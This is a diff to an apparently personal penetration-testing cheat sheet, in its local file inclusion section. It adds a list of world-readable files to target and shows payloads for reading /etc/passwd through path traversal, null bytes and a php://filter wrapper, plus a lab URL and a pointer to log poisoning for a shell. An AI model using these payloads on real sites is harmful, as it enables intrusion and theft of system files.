@@ -702,6 +702,13 @@ if found PING SEARCHBOX in website then use below command to get reverse shell
 LOCAL FILE INCLUSION
 ==================== 
 
+
+Windows file accessible to all users
+	c:\windows\system32\drivers\etc\hosts	
+Linux file accessible to all users
+	/etc/passwd
+
+
 Basic file inclusion: xxx.php?language=/etc/passwd             (../) or simply (/)
 Null byte inclusion: xxx.php?language=/etc/passwd%00           (%00) or (%00jpg)
 Base64 encoded inclusion: xxx.php?language=php://filter/read=convert.base64-encoded/resource=/etc/passwd
@@ -742,7 +749,7 @@ So that means it appends everything to .php so to bypass this .php appending at 
 	http://10.10.90.167/?view=dog)../../../etc/passwd&ext=
 we get the etc/passwd
 	Now do Apache Log Poisoning through LFI to get a shell
-	
+
 -----------
 PHP wrapper
 -----------
